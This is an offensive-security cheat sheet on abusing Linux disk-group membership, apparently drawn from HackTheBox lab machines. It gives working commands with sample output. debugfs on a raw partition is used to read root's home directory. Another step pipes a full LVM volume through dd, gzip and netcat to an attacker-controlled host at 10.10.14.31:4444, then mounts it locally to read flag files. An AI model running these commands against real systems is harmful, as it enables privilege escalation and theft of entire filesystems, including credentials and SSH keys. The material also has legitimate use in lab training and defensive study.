---
title: "Disk Group"
date: 2025-7-25
tags: ["Privilege Escalation", "Data Exfiltration", "File System Mounting", "Disk", "Backup", "Privilege Read", "Container", "LVM", "Debugfs"]
---

### General

```console
# Show devices
lsblk
```

```console {class="sample-code"}
$ lsblk
NAME                   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
sda                      8:0    0   12G  0 disk 
├─sda1                   8:1    0  120M  0 part /boot
├─sda2                   8:2    0    1K  0 part 
└─sda5                   8:5    0 11.9G  0 part 
  ├─Kotarak--vg-root   252:0    0    7G  0 lvm  /
  └─Kotarak--vg-swap_1 252:1    0    1G  0 lvm  [SWAP]
sr0                     11:0    1 1024M  0 rom
```

```console
# Device attributes
blkid
```

```console {class="sample-code"}
$ blkid
/dev/sda1: UUID="67e178a9-1b2a-407e-8d3f-7b1772bab2be" TYPE="ext2" PARTUUID="1b9f3540-01"
/dev/sda5: UUID="LnUYcF-uZX0-c91G-XfUl-6BqJ-gk8W-QtnncD" TYPE="LVM2_member" PARTUUID="1b9f3540-05"
/dev/mapper/Kotarak--vg-root: UUID="efb44a28-8edc-4d40-aca3-81e57d58d759" TYPE="ext4"
/dev/mapper/Kotarak--vg-swap_1: UUID="162b2913-7dcf-4ba7-bddc-238a22f16e52" TYPE="swap"
```

```console
# Show device mapping
ls -l /dev/mapper/
```

```console {class="sample-code"}
$ ls -l /dev/mapper/
total 0
crw------- 1 root root 10, 236 Sep 22 23:22 control
lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-root -> ../dm-0
lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-swap_1 -> ../dm-1
```

```console
# Show swap on blk
swapon -s
```

```console {class="sample-code"}
$ swapon -s
Filename                                Type            Size    Used    Priority
/dev/dm-1                               partition       1048572 0       -1
```

```console
# Filesystem info
cat /etc/fstab
```

```console {class="sample-code"}
$ cat /etc/fstab
# /etc/fstab: static file system information.
#
# Use 'blkid' to print the universally unique identifier for a
# device; this may be used with UUID= as a more robust way to name devices
# that works even if disks are added and removed. See fstab(5).
#
# <file system> <mount point>   <type>  <options>       <dump>  <pass>
/dev/mapper/Kotarak--vg-root /               ext4    errors=remount-ro 0       1
# /boot was on /dev/sda1 during installation
UUID=67e178a9-1b2a-407e-8d3f-7b1772bab2be /boot           ext2    defaults        0       2
/dev/mapper/Kotarak--vg-swap_1 none            swap    sw              0       0
/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
```

---

### Abuse #1: Read Host's Filesystem from Container (root)

#### 1. Open Target Device

```console
debugfs /dev/sda1
```

```console {class="sample-code"}
$ debugfs /dev/sda1
debugfs 1.44.1 (24-Mar-2018)
```

```console
# Read
ls -l /root
```

```console {class="sample-code"}
   2456   40750 (2)      0      0    4096 23-Sep-2024 06:49 .
      2   40755 (2)      0      0    4096 24-Nov-2023 10:10 ..
   2457  100600 (1)      0      0    3121 27-Nov-2017 22:45 .bashrc
   2458  100600 (1)      0      0     148 17-Aug-2015 18:30 .profile
  50878   40700 (2)      0      0    4096 13-Sep-2022 18:51 .cache
  50115  100400 (1)      0      0      33 23-Sep-2024 06:49 root.txt
 131982   40755 (2)      0      0    4096 24-Nov-2023 09:41 .nano
  56604   40755 (2)      0      0    4096 13-Sep-2022 18:51 .ssh
  30962  120777 (7)      0      0       9 13-Sep-2022 18:36 .bash_history

(END)
```

---

### Abuse #2: Read Container's Filesystem from Host

#### 1. Show LVM Mappings

```console
ls -l /dev/mapper/
```

```console {class="sample-code"}
$ ls -l /dev/mapper/
total 0
crw------- 1 root root 10, 236 Sep 22 23:22 control
lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-root -> ../dm-0
lrwxrwxrwx 1 root root       7 Sep 22 23:22 Kotarak--vg-swap_1 -> ../dm-1
```

#### 2. Exfil Container's Filesystem

```console
# In our local machine
nc -lvnp <LOCAL_PORT> > <DEVICE_MAPPING>.gz
```

```console {class="sample-code"}
$ nc -lvnp 4444 > dm-0.gz
listening on [any] 4444 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.55] 35450
```

```console
# Target container rootfs, e.g. dm-0
dd if=/dev/<DEVICE_MAPPING> | gzip -1 - | nc <LOCAL_IP> <LOCAL_PORT>
```

```console {class="sample-code"}
$ dd if=/dev/dm-0 | gzip -1 - | nc 10.10.14.31 4444
14680064+0 records in
14680064+0 records out
7516192768 bytes (7.5 GB, 7.0 GiB) copied, 306.697 s, 24.5 MB/s
```

#### 3. Mount Locally

```console
# Extract dm-0
gunzip <DEVICE_MAPPING>.gz
```

```console {class="sample-code"}
$ gunzip dm-0.gz
```

```console
# Mount the filesystem
sudo mount <DEVICE_MAPPING> /mnt/ 
```

```console {class="sample-code"}
$ sudo mount dm-0 /mnt/
```

```console
# Read
ls /mnt/root/
```

```console {class="sample-code"}
$ ls /mnt/root/
app.log  flag.txt
```

<small>*Note: can take a long time to transfer*</small>
